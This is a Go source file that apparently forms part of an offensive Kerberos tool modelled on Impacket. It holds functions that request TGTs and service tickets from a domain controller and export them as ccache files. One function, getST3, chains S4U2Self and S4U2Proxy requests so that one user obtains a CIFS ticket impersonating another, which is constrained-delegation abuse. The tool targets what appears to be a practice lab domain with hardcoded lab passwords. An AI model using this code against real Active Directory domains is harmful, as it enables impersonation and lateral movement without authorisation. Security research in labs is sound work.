package main

import (
	"log"
	"strings"

	"github.com/redt1de/gimpacket/pkg/gokrb5/iana/nametype"
	"github.com/redt1de/gimpacket/pkg/gokrb5/messages"
	"github.com/redt1de/gimpacket/pkg/gokrb5/types"
)

// TODO:
// need to iterate through the etypes if KDC_ERR_ETYPE_NOSUPP is returned
func getTGT(domain string, user string, pass string, hash string, ccacheAuth bool, dcip string, outputfile string) {
	cl := GetKerberosClient(domain, dcip, user, pass, hash, ccacheAuth, "aes256-cts-hmac-sha1-96", "", 0)
	err := cl.Login()
	if err != nil {
		log.Fatal(err)
	}

	ASReq, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		log.Fatal(err)
	}

	ASRep, err := cl.ASExchange(cl.Credentials.Domain(), ASReq, 0)
	if err != nil {
		log.Fatal(err)
	}

	cc, err := ASRep.ToCCache()
	if err != nil {
		log.Fatal(err)
	}
	if outputfile == "" {
		outputfile = "./" + user + ".tgt.ccache"
	}
	cc.Export(outputfile)

}

func getST(domain string, user string, pass string, hash string, ccacheAuth bool, dcip string, spn string, impersonate string, outputfile string) {
	cl := GetKerberosClient(domain, dcip, user, pass, hash, ccacheAuth, "aes256-cts-hmac-sha1-96", "", 0)
	err := cl.Login()
	if err != nil {
		log.Fatal(err)
	}
	var skey types.EncryptionKey
	var tgsRep messages.TGSRep

	princ := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, spn)
	realm := cl.SpnRealm(princ)

	if realm == "" {
		realm = cl.Credentials.Realm()
	}
	tgt, skey, err := cl.GetSessionTGT(realm)
	if err != nil {
		log.Fatal(err)
	}

	if impersonate == "" {
		_, tgsRep, err = cl.TGSREQGenerateAndExchange(princ, realm, tgt, skey, false)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		// _, tgsRep, err = cl.TGSREQGenerateAndExchangeS4U(princ, realm, tgt, skey, false, impersonate)
		// if err != nil {
		// 	log.Fatal(err)
		// }

	}

	cc, err := tgsRep.ToCCache()
	if err != nil {
		log.Fatal(err)
	}
	if outputfile == "" {
		outputfile = "./" + user + "-" + strings.ReplaceAll(spn, "/", "_") + ".st.ccache"
	}
	cc.Export(outputfile)

}

// #### up next:
// move the s4u code below to a new func in client.go: client.TGSREQGenerateAndExchangeS4U(spn types.PrincipalName, kdcRealm string, tgt messages.Ticket, sessionKey types.EncryptionKey, renewal bool)

// testing getST with impersonation
func getST3(domain string, user string, pass string, hash string, ccacheAuth bool, dcip string, spn string, impersonate string, outputfile string) {
	cl := GetKerberosClient(domain, dcip, user, pass, hash, ccacheAuth, "aes256-cts-hmac-sha1-96", "", 0)
	err := cl.Login()
	if err != nil {
		log.Fatal(err)
	}
	var skey types.EncryptionKey
	var tgsRep, tgsRep2 messages.TGSRep

	spnprinc := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, spn)
	realm := cl.SpnRealm(spnprinc)

	// if we don't know the SPN's realm, ask the client realm's KDC
	if realm == "" {
		realm = cl.Credentials.Realm()
	}
	tgt, skey, err := cl.GetSessionTGT(realm)
	if err != nil {
		log.Fatal(err)
	}

	// spew.Dump(cl.Credentials.CName())
	tgsReq, err := messages.NewTGSReqS4U2Self(cl.Credentials.CName(), realm, cl.Config, tgt, skey, spnprinc, false, impersonate)
	if err != nil {
		log.Fatal(err)
	}
	_, tgsRep, err = cl.TGSExchange(tgsReq, realm, tgsRep.Ticket, skey, 0)
	if err != nil {
		log.Fatal(err)
	}

	tgsReq2, err := messages.NewTGSReqS4U2Proxy(cl.Credentials.CName(), realm, cl.Config, tgt, skey, spnprinc, false, impersonate, &tgsRep.Ticket)
	if err != nil {
		log.Fatal(err)
	}
	_, tgsRep2, err = cl.TGSExchange(tgsReq2, realm, tgsRep2.Ticket, skey, 0)
	if err != nil {
		log.Fatal(err)
	}

	cc, err := tgsRep2.ToCCache()
	if err != nil {
		log.Fatal(err)
	}
	if outputfile == "" {
		outputfile = "./" + user + "-" + strings.ReplaceAll(spn, "/", "_") + ".st.ccache"
	}
	cc.Export(outputfile)

}

func main() {
	// getTGT("north.sevenkingdoms.local", "eddard.stark", "FightP3aceAndHonor!", "", false, "winterfell.north.sevenkingdoms.local")
	// getST("north.sevenkingdoms.local", "eddard.stark", "FightP3aceAndHonor!", "", false, "winterfell.north.sevenkingdoms.local", "Host/winterfell.north.sevenkingdoms.local")
	getST3("NORTH.SEVENKINGDOMS.LOCAL", "jon.snow", "iknownothing", "", false, "winterfell.NORTH.SEVENKINGDOMS.LOCAL", "CIFS/winterfell.NORTH.SEVENKINGDOMS.LOCAL", "eddard.stark", "")
}
